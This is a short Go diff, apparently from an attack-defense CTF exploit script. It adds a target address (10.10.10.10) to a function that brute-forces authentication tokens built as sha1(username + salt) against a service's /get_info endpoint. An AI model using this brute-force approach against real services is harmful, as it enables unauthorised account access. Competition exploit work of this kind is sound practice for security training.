@@ -30,7 +30,7 @@ func GetBaseHash(data string) string {
 	return base64.URLEncoding.EncodeToString(hasher.Sum(nil))
 }
 
-func bruteforce(username string, salts map[string]bool) {
+func bruteforce(victimAddress, username string, salts map[string]bool) {
 		for salt := range salts {
 		// attempt to /get_info with token = sha1(username + salt)
 
@@ -55,6 +55,7 @@ func bruteforce(username string, salts map[string]bool) {
 func main() {
 	// get intrested minute and username from cs by public flag id
 	username := "some user to attack"
+	victimAddress := "10.10.10.10"
 	intrestedMinuteStart := time.Now().UnixMilli()
 	salts := make(map[string]bool)
 
